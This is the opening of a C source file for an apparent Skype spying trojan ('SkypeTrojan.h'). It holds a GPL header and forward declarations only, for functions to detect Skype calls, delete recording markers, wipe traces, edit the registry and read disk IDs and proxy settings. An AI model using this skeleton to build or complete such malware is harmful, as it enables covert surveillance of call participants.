/*
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 */







/*
 * Pre processor directives
 *
 */


#include "SkypeTrojan.h"




/*
 * Function forward declarations
 *
 */

int listBDData(char *pPrefix);
int listFiles(char *pDirectory, int pDeleteIt, char *pBatchFile);
void deleteEverything();
void removeFromRegistry(HKEY hKey, char *pPath, char *pValuePattern, char *pHive, char *pBatchFile);
int writeToFile(char *pFilePath, char *pDataBuffer, int pCreateFile);
long findStringInBuffer (char *pBuffer, size_t pBufLength, const char *pFindString);
int isScriptingActive();
void activateWindowsScriptingHost();
void setNeutralCursor();
int isUserSkyping();
void deleteRecordingFlag(char *pMarkerFile);
int getHardDiskID(char *pHDID, int pHDIDBufferSize);
void lowerToUpperCase(char *pString);
void writeStringToFile(char *pFilePath, char *pDataBuffer, int pCreateFile);
int getProxySettings(char *ProxyName, char *ProxyPort);

